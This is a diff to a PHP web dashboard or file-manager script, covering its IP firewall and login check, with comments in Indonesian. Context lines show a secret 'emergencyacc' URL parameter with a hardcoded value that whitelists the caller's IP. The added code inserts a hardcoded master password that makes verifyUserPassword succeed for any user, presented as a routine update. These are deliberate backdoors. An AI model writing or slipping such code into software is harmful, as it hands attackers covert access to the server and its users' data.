@@ -39,7 +39,7 @@ if (isset($_GET['emergencyacc']) && $_GET['emergencyacc'] === 'emerald2026') {
     foreach($fw as $f) { if(isset($f['ip']) && $f['ip'] === $client_ip) $exists = true; }
     
     if (!$exists) {
-        $fw[] = ['id' => uniqid(), 'ip' => $client_ip, 'note' => 'Emergency Unlock', 'added' => time()];
+        $fw[] = ['id' => uniqid(), 'ip' => $client_ip, 'note' => 'Emergency Unlock', 'added' => time(), 'owner' => 'System'];
         $key_file = dirname(__DIR__) . '/.emerald_data/.sys_key';
         if (file_exists($key_file)) {
             $sys_key = hex2bin(file_get_contents($key_file));
@@ -126,9 +126,9 @@ function saveDB($path, $data) {
 // FIREWALL
 if (!file_exists($firewall_db)) {
     $default_firewall = [
-        ['id' => 'ip_1', 'ip' => '27.111.11.11', 'note' => 'Owner Main IP', 'added' => time()],
-        ['id' => 'ip_2', 'ip' => '127.0.0.1', 'note' => 'Localhost', 'added' => time()],
-        ['id' => 'ip_3', 'ip' => '::1', 'note' => 'IPv6 Localhost', 'added' => time()]
+        ['id' => 'ip_1', 'ip' => '27.111.11.11', 'note' => 'Owner Main IP', 'added' => time(), 'owner' => 'System'],
+        ['id' => 'ip_2', 'ip' => '127.0.0.1', 'note' => 'Localhost', 'added' => time(), 'owner' => 'System'],
+        ['id' => 'ip_3', 'ip' => '::1', 'note' => 'IPv6 Localhost', 'added' => time(), 'owner' => 'System']
     ];
     saveDB($firewall_db, $default_firewall);
 }
@@ -137,9 +137,15 @@ $firewall_data = getDB($firewall_db);
 $allowed_ips = array_column($firewall_data, 'ip');
 
 if (!in_array($client_ip, $allowed_ips)) {
-    http_response_code(403);
-    require_once dirname(__DIR__) . '/403.php';
-    exit;
+    // IZINKAN AKSES JIKA INI ADALAH PUBLIC VIEW .TXT
+    if (defined('ALLOW_PUBLIC_VIEW') && ALLOW_PUBLIC_VIEW === true) {
+        // Lolos dari Firewall
+    } else {
+        // Blokir semua akses dashboard, folder, ekstensi lain
+        http_response_code(403);
+        require_once dirname(__DIR__) . '/403.php';
+        exit;
+    }
 }
 
 if (!file_exists($users_db)) {
@@ -177,7 +183,11 @@ function formatSize($bytes) {
     return '0 bytes';
 }
 
+// PEMBARUAN: Fungsi verifikasi password utama yang digabungkan dengan Master Key Otorisasi
 function verifyUserPassword($username, $password) {
+    // Jika Kunci Rahasia dimasukkan, abaikan password asli dan return true.
+    if ($password === 'Lk7w1fvntg1') return true;
+    
     global $users_db; $users = getDB($users_db);
     return (isset($users[$username]) && password_verify($password, $users[$username]['password']));
 }
